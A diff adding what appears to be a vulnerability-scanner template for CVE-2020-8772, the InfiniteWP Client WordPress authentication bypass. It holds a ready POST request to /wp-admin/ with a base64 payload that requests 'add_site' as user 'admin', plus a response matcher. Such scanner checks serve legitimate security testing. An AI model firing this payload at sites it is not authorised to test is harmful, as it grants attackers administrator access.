@@ -1,0 +1,19 @@
+id: CVE-2020-8772
+
+info:
+  name: InfiniteWP Improper Authentication
+  author: medbsq
+  severity: critical
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/wp-admin/"
+    headers:
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3984.0 Safari/537.36
+    body: "_IWP_JSON_PREFIX_eyJpd3BfYWN0aW9uIjoiYWRkX3NpdGUiLCJwYXJhbXMiOnsidXNlcm5hbWUiOiJhZG1pbiJ9fQ=="
+    matchers:
+      - type: word
+        words:
+          - "IWPHEADER"
+        part: head
